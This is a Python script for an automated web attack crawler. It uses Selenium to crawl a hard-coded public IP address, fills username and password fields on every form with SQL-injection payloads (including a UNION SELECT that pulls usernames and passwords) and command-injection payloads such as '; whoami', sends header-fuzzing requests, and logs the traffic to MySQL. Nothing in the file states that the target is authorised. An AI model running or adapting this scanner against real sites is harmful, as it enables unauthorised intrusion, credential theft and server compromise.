import os
import threading
import time
import mysql.connector
from seleniumwire import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.by import By
from dotenv import load_dotenv
import random
import json
import gzip
from io import BytesIO
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Load credentials from .env file
load_dotenv()
id_counter = 1
lock = threading.Lock()

# MySQL database connection
db_connection = mysql.connector.connect(
    host='127.0.0.1',
    user='root',
    password=os.getenv('MYSQL_PASSWORD'),
    database='screen_rec'
)
c_rsp = db_connection.cursor()
c_lrn = db_connection.cursor()
c_main = db_connection.cursor()

# Selenium WebDriver path
driver_path = os.getenv('CHROMEDRIVER_PATH')

# Header Fuzzing
header_keys = [
    "Accept",
    "Accept-Charset",
    "Accept-Encoding",
    "Accept-Language",
    "User-Agent",
    "Connection"
]

def get_header_values(header):
    """Generate random values for HTTP headers."""
    values = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Charset": "utf-8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Connection": "keep-alive"
    }
    return values.get(header, "")

def header_fuzzer():
    """Generate a set of headers for fuzzing."""
    headers = {}
    header_num = random.randint(1, 6)
    header_list = random.sample(header_keys, header_num)
    for header in header_list:
        headers[header] = get_header_values(header)
    return headers

def apply_fuzzing_headers(driver):
    """Apply fuzzing headers using JavaScript."""
    headers_str = header_fuzzer()
    for header_name, header_value in headers_str.items():
        try:
            # Ensure correct JavaScript syntax
            js_code = f"""
            var xhr = new XMLHttpRequest();
            xhr.open('POST', window.location.href, true);
            xhr.setRequestHeader('{header_name}', `{header_value}`);
            xhr.send();
            """
            driver.execute_script(js_code)
            time.sleep(10)
        except Exception as e:
            print(f"Header fuzzing error: {e}")

def decode_safe(data):
    """Safely decode data if it's in bytes, otherwise return it as is."""
    if isinstance(data, bytes):
        try:
            return data.decode('utf-8', errors='replace')
        except Exception as e:
            print(f"Decoding error: {e}")
            return "<DECODING_ERROR>"
    elif isinstance(data, str):
        return data
    else:
        print("Unsupported data type")
        return "<UNSUPPORTED_TYPE>"

def decompress_gzip(compressed_data):
    """Decompress gzip-encoded data."""
    try:
        with gzip.GzipFile(fileobj=BytesIO(compressed_data)) as gzip_file:
            return gzip_file.read()
    except Exception as e:
        print(f"Error decompressing gzip data: {e}")
        return None

def save_to_db(req_method, req_path, req_query, req_headers, req_body, res_status, res_headers, res_body):
    """Save request and response data to the database."""
    lock.acquire()
    global id_counter

    try:
        # Decode query and body if they are in bytes
        if isinstance(req_query, bytes):
            req_query = req_query.decode("utf-8")
        if isinstance(req_body, bytes):
            req_body = req_body.decode("utf-8")
        
        # Convert HTTPHeaders to dictionary
        if hasattr(req_headers, 'items'):
            req_headers = dict(req_headers.items())
        if hasattr(res_headers, 'items'):
            res_headers = dict(res_headers.items())
        
        # Convert headers to JSON strings
        req_headers_json = json.dumps(req_headers) if isinstance(req_headers, dict) else req_headers
        req_body_json = json.dumps(req_body) if isinstance(req_body, dict) else req_body
        res_body_json = json.dumps(res_body) if isinstance(res_body, dict) else res_body

        # Replace spaces with '#' in JSON strings
        req_headers_json = req_headers_json.replace(" ", "#")
        req_body_json = req_body_json.replace(" ", "#")

        # Handle gzip compression in response body
        if isinstance(res_body, bytes):
            try:
                if "gzip" in str(res_headers).lower():
                    res_body = decompress_gzip(res_body)
                if res_body is not None:
                    res_body = res_body.decode('utf-8', errors='ignore')
                    res_body = res_body.encode()
                else:
                    res_body = "<DECOMPRESSION_ERROR>"
            except Exception as e:
                print(f"Error processing response body: {e}")
                res_body = "<PROCESSING_ERROR>"

        res_body_json = json.dumps(res_body) if isinstance(res_body, dict) else res_body.decode('utf-8', errors='ignore')

        # Check if response already exists
        c_rsp.execute('SELECT res_id FROM http_response WHERE status = %s AND headers = %s AND body = %s', 
                      (res_status, json.dumps(res_headers), res_body_json))
        result = c_rsp.fetchall()

        if result:
            res_id = result[0][0]
        else:
            sql_rsp = 'INSERT INTO http_response (status, headers, body) VALUES (%s, %s, %s)'
            c_rsp.execute(sql_rsp, (res_status, json.dumps(res_headers), res_body_json))
            res_id = c_rsp.lastrowid
            id_counter += 1

        # Insert request data
        sql_req = 'INSERT INTO request_data (method, path, query, headers, body, res_id) VALUES (%s, %s, %s, %s, %s, %s)'
        c_lrn.execute(sql_req, (req_method, req_path, req_query, req_headers_json, req_body_json, res_id))
        db_connection.commit()

    except Exception as e:
        print(f"Failed to save to DB: {e}")

    finally:
        lock.release()



# SQL and Command Injection Payloads
sql_injection_payloads = [
    "' OR '1'='1",
    "' UNION SELECT NULL, username, password FROM users --",
    "' OR '1'='1' --",
    '" OR "" = "',
    '" OR 1=1 --',
    "' OR 1=1 --",
    "admin' --",
    "' OR 1=1#"
]

command_injection_payloads = [
    "; ls",
    "| ls",
    "; whoami",
    "| whoami",
    "; uname -a",
    "| uname -a",
    "; id",
    "| id"
]

def get_internal_links(driver, base_url):
    """Extract all internal links from the current page."""
    links = set()
    anchor_elements = driver.find_elements(By.TAG_NAME, "a")
    
    for element in anchor_elements:
        href = element.get_attribute("href")
        if href and href.startswith(base_url):
            links.add(href)
    
    return links
from selenium.common.exceptions import StaleElementReferenceException, NoSuchElementException

def submit_form_with_button(driver, form):
    """Locate and click the submit button to submit the form."""
    try:
        submit_button = form.find_element(By.XPATH, "//button[@type='submit']")  # Adjust the XPath as needed
        submit_button.click()
        print("[+] Submit button clicked.")
    except Exception as e:
        print(f"Error clicking submit button: {e}")

from selenium.common.exceptions import StaleElementReferenceException, NoSuchElementException
from selenium.webdriver.common.action_chains import ActionChains
import time

def fuzz_and_submit_forms(driver, form, payloads):
    """Fuzz and submit forms with a list of payloads specifically for username and password fields."""
    # Define common names or IDs for username and password fields
    username_identifiers = ["username", "user", "login", "email"]
    password_identifiers = ["password", "pass", "pwd", "passwd", "confirm_password"]

    # Apply all payloads to username and password fields
    for payload in payloads:
        try:
            # Re-fetch form elements to avoid stale element reference
            input_fields = form.find_elements(By.TAG_NAME, "input")
            payload_applied = False

            for field in input_fields:
                field_placeholder = field.get_attribute('placeholder').lower()

                if any(identifier in field_placeholder for identifier in username_identifiers):
                    field.clear()  # Clear the input field before entering new data
                    ActionChains(driver).send_keys_to_element(field, payload).perform()
                    print(f"[+] Submitted payload to username field: {payload}")
                    payload_applied = True

                elif any(identifier in field_placeholder for identifier in password_identifiers):
                    field.clear()  # Clear the input field before entering new data
                    ActionChains(driver).send_keys_to_element(field, payload).perform()
                    print(f"[+] Submitted payload to password field: {payload}")
                    payload_applied = True

            # If any payload was applied, submit the form
            if payload_applied:
                try:
                    # Option 1: Use form.submit()
                    form.submit()
                    print("[+] Form submitted using form.submit()")
                    
                except Exception as e:
                    print(f"Error submitting form using form.submit(): {e}")

                try:
                    # Option 2: Click the submit button explicitly
                    submit_form_with_button(driver, form)
                except Exception as e:
                    print(f"Error submitting form using submit_form_with_button(): {e}")

                apply_fuzzing_headers(driver)
                time.sleep(6)  # Wait for the request to process
                continue  # Move to the next payload

        except (StaleElementReferenceException, NoSuchElementException) as e:
            print(f"Error interacting with input fields: {e}")
            print(f"Moving to next payload after failure: {payload}")
            continue  # Move to the next payload

    print(f"All payloads processed for the form.")





def crawl_by_selenium(url, driver, visited_urls):
    """Crawl and fuzz a website recursively."""
    if url in visited_urls:
        return
    
    print("[*] Accessing web server:", url)
    visited_urls.add(url)
    
    try:
        driver.get(url)
        time.sleep(15)  # Wait for the page to load completely
    except Exception as e:
        print(f"Error loading page: {e}")
        return

    # Fuzz input fields and submit form
    forms = driver.find_elements(By.TAG_NAME, "form")
    if forms:
        for form in forms:
            fuzz_and_submit_forms(driver, form, sql_injection_payloads)
            fuzz_and_submit_forms(driver, form, command_injection_payloads)
    else:
        print("[*] No forms found on this page.")

    # Crawl internal links
    internal_links = get_internal_links(driver, url)
    
    for link in internal_links:
        if link not in visited_urls:
            crawl_by_selenium(link, driver, visited_urls)


def main():
    options = Options()
    options.headless = True
    service = Service(driver_path)
    driver = webdriver.Chrome(service=service, options=options)
    
    # Clear the database tables before new entries
    sql_main = 'DELETE from request_data'
    c_main.execute(sql_main)
    db_connection.commit()
    
    sql_main = 'DELETE from http_response'
    c_main.execute(sql_main)
    db_connection.commit()
    

    start_time = time.time()

    visited_urls = set()  # To keep track of visited URLs
    
    
    
    url = f"http://54.206.96.54"
    crawl_by_selenium(url, driver, visited_urls)

    driver.quit()
    print("[*] Crawling Time:", time.time() - start_time)

    # Get response_id and set id_counter (id_counter = max(res_id) + 1)
    try:
        c_lrn.execute('SELECT MAX(res_id) FROM learning_table')
        id_counter = c_lrn.fetchall()[0][0] + 1
    except:
        id_counter = 1

    # Thread Exclusion control
    lock = threading.Lock()

    c_lrn.close()
    c_rsp.close()
    db_connection.close()



if __name__ == "__main__":
    main()
